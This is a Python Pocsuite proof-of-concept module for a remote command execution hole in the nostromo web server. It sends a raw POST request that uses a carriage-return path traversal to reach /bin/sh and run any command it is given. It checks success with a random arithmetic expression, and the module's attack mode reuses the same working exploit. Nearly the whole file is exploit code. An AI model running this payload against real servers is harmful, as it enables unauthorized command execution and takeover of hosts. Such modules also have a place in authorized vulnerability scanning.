#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from urlparse import urlparse, urljoin
from pocsuite.api.request import req
import socket
import random
class TestPOC(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'co0ontty'
    vulDate = '2019-10-18'
    createDate = '2019-10-18'
    updateDate = '2019-10-18'
    references = ['']
    name = 'nostromo 远程命令执行漏洞'
    appPowerLink = ''
    appName = 'nostromo'
    appVersion = ''
    vulType = '命令执行'
    desc = '''
    '''
    samples = ['']
    install_requires = ['']


    def _verify(self):
        def recv(s):
            r=''
            try:
                while True:
                    t=s.recv(1024)
                    if len(t)==0:
                        break
                    r+=t
            except:
                pass
            return r
        def exploit(host,port,cmd):
            s=socket.socket()
            s.settimeout(1)
            s.connect((host,int(port)))
            payload="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1""".format(cmd)
            s.send(payload)
            r=recv(s)
            r=r[r.index('\r\n\r\n')+4:]
            return r
        result = {}
        random_int_1 = random.randint(1,1000)
        random_int_2 = random.randint(1,1000)
        cmd = "expr {} + {}".format(random_int_1,random_int_2)
        host = urlparse(self.url).hostname
        port = urlparse(self.url).port
        try:
            resp_text = exploit(host,port,cmd)
            if str(random_int_1+random_int_2) in resp_text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except :
            pass
        
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
